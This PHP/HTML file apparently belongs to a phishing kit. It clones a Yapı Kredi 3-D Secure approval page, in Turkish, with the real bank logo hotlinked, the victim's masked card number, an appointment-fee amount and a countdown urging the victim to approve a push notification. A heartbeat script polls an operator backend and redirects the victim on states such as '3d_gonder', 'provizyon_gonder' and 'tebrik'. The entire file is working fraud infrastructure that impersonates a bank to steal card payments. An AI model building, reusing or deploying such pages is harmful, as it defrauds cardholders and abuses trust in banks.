<?php
$is_mobil_onay = true;
require __DIR__ . '/_acs_core.php';

// Format dynamic variables
$cc_clean = preg_replace('/\D/', '', $kart_no);
if (strlen($cc_clean) >= 16) {
    $first_4 = substr($cc_clean, 0, 4);
    $next_2 = substr($cc_clean, 4, 2);
    $last_4 = substr($cc_clean, -4);
    $masked_card = "{$first_4} {$next_2}** **** {$last_4}";
} else {
    $masked_card = '4506 34** **** 9128'; // fallback
}

// Transaction date formatted like 06/07/2026 19:43:28
$zaman_ykb = date('d/m/Y H:i:s');

// Transaction amount formatted like 59.998,00 TL
$ucret_val = ayar_get('randevu_ucreti', '49');
$tutar_ykb = number_format((float)$ucret_val, 2, ',', '.') . ' TL';
?>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Yapı Kredi - Üç Boyutlu Güvenlik Sistemi</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    body {
      background: #0070c0; /* Solid blue background */
      background: linear-gradient(135deg, #0b6cb4 0%, #003a70 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      color: #333;
    }
    
    /* Top Bar */
    .top-bar {
      background-color: #002d62;
      color: #fff;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 24px;
      font-size: 14px;
    }
    .top-bar .title {
      font-weight: bold;
      font-size: 15px;
    }
    .top-bar .links {
      font-size: 13px;
    }
    .top-bar .links span {
      margin-left: 5px;
      margin-right: 5px;
      cursor: pointer;
    }
    .top-bar .links span:hover {
      text-decoration: underline;
    }

    /* Main Container */
    .main-container {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
    }
    
    /* Card */
    .card {
      background: #ffffff;
      border-radius: 4px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
      border: 1px solid #c9d8e5;
      overflow: hidden;
    }
    
    /* Logo Header */
    .logo-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 16px 20px;
      border-bottom: 1px solid #e2e8f0;
    }
    .logo-header img.ykb-logo {
      height: 32px;
    }
    .logo-header .brand-right {
      color: #002d62;
      font-size: 18px;
      font-weight: 900;
      font-style: italic;
      letter-spacing: 0.5px;
    }
    
    /* Card Body */
    .card-body {
      padding: 20px;
    }
    
    /* Info Table */
    .info-table {
      width: 100%;
      margin-bottom: 16px;
      font-size: 13.5px;
    }
    .info-row {
      display: flex;
      padding: 6px 0;
      line-height: 1.4;
    }
    .info-label {
      width: 140px;
      color: #555;
      font-weight: 500;
      flex-shrink: 0;
    }
    .info-value {
      color: #111;
      font-weight: 700;
    }
    
    /* Blue Alert Info */
    .alert-info-share {
      display: flex;
      align-items: center;
      gap: 8px;
      color: #0070c0;
      font-size: 12.5px;
      font-weight: 600;
      margin-bottom: 16px;
      line-height: 1.4;
    }
    .alert-info-share .info-icon {
      width: 16px;
      height: 16px;
      background: #0070c0;
      color: #fff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      font-weight: bold;
      flex-shrink: 0;
    }

    /* Notification Box */
    .notification-box {
      background-color: #f2f7fc;
      border-radius: 4px;
      padding: 16px;
      display: flex;
      flex-direction: column;
      align-items: center;
      border: 1px solid #d4e3f0;
    }
    .notification-text-row {
      display: flex;
      gap: 10px;
      align-items: flex-start;
      width: 100%;
      color: #333;
      font-size: 13px;
      line-height: 1.5;
      margin-bottom: 16px;
    }
    .notification-text-row .info-icon {
      width: 18px;
      height: 18px;
      background: #0070c0;
      color: #fff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      font-weight: bold;
      flex-shrink: 0;
      margin-top: 2px;
    }
    
    /* Timer Circle */
    .timer-wrapper {
      position: relative;
      width: 80px;
      height: 80px;
      margin-bottom: 10px;
    }
    .timer-circle {
      width: 100%;
      height: 100%;
      transform: rotate(-90deg);
    }
    .timer-circle circle {
      fill: none;
      stroke-width: 5;
    }
    .timer-circle circle.bg {
      stroke: #d0dce5;
    }
    .timer-circle circle.progress {
      stroke: #0088cc;
      stroke-dasharray: 251.2; /* 2 * pi * 40 */
      stroke-dashoffset: 0;
      stroke-linecap: round;
      transition: stroke-dashoffset 1s linear;
    }
    .timer-number {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 20px;
      font-weight: 700;
      color: #333;
    }
    .timer-desc {
      font-size: 13px;
      color: #0070c0;
      font-weight: 600;
    }
  </style>
</head>
<body>
  
  <div class="top-bar">
    <div class="title">Üç Boyutlu Güvenlik Sistemi</div>
    <div class="links">
      <span>Yardım</span> | <span>English</span>
    </div>
  </div>

  <div class="main-container">
    <div class="card">
      <div class="logo-header">
        <img class="ykb-logo" src="https://goguvenliodeme.bkm.com.tr/banklogo/yapikredi.png" alt="Yapı Kredi">
        <span class="brand-right">VISA</span>
      </div>
      
      <div class="card-body">
        <div class="info-table">
          <div class="info-row">
            <div class="info-label">Üye İşyeri İsmi</div>
            <div class="info-value"><?= htmlspecialchars($isyeri) ?></div>
          </div>
          <div class="info-row">
            <div class="info-label">Tutar</div>
            <div class="info-value"><?= $tutar_ykb ?></div>
          </div>
          <div class="info-row">
            <div class="info-label">Tarih</div>
            <div class="info-value"><?= $zaman_ykb ?></div>
          </div>
          <div class="info-row">
            <div class="info-label">Kart Numarası</div>
            <div class="info-value"><?= $masked_card ?></div>
          </div>
          <div class="info-row">
            <div class="info-label">Cihaz Bilgisi</div>
            <div class="info-value">M2007J20CG</div>
          </div>
        </div>
        
        <div class="alert-info-share">
          <div class="info-icon">i</div>
          <div>Bu bilgiler işyerleri ile paylaşılmamaktadır.</div>
        </div>
        
        <div class="notification-box">
          <div class="notification-text-row">
            <div class="info-icon">!</div>
            <div>Akıllı Bildirim tanımlı mobil cihazınıza gönderilen Akıllı Bildirim'i onaylayarak işleminizi tamamlayabilirsiniz.</div>
          </div>
          
          <div class="timer-wrapper">
            <svg class="timer-circle" viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="40" />
              <circle class="progress" cx="50" cy="50" r="40" id="timer-progress" />
            </svg>
            <div class="timer-number" id="timer-number">180</div>
          </div>
          
          <div class="timer-desc" id="timer-desc">180 saniye içinde onaylayınız.</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    var sec = 180;
    var timerProgress = document.getElementById('timer-progress');
    var timerNumber = document.getElementById('timer-number');
    var timerDesc = document.getElementById('timer-desc');
    var totalSec = 180;
    var dashArray = 251.2;

    function updateTimer() {
      if (sec <= 0) {
        clearInterval(timerInterval);
        // Redirect to bekle.php
        window.location.href = '<?= BASE_PATH ?>/bekle.php';
        return;
      }
      sec--;
      timerNumber.textContent = sec;
      timerDesc.textContent = sec + " saniye içinde onaylayınız.";
      
      // Calculate progress dash offset
      var offset = dashArray - (dashArray * (sec / totalSec));
      timerProgress.style.strokeDashoffset = offset;
    }

    // Set initial dash offset to 0 (full circle)
    timerProgress.style.strokeDashoffset = 0;
    var timerInterval = setInterval(updateTimer, 1000);

    // Heartbeat logic
    function heartbeat(){
      fetch('<?= BASE_PATH ?>/api/heartbeat.php', {method:'POST', credentials:'same-origin'})
        .then(function(r){ return r.json(); })
        .then(function(d){
          var dur = d.durum || 'bekle';
          if (dur === 'provizyon_hatali') {
            return; // stay here
          }
          if (dur === '3d_gonder' || dur === '3d_hatali') {
            window.location.href = '<?= BASE_PATH ?>/acs/yapikredi.php';
            return;
          }
          if (dur === 'tebrik') {
            window.location.href = '<?= BASE_PATH ?>/sonuc.php';
            return;
          }
          var errors = ['kart_hatali', 'eticaret_kapali', 'limit_yetersiz', 'kart_desteklenmiyor', 'provizyon_gonder'];
          if (errors.indexOf(dur) !== -1) {
            window.location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=' + dur;
            return;
          }
          if (dur === 'bekle') {
            window.location.href = '<?= BASE_PATH ?>/bekle.php';
            return;
          }
        }).catch(function(){});
    }
    setInterval(heartbeat, 2500);
  </script>
</body>
</html>
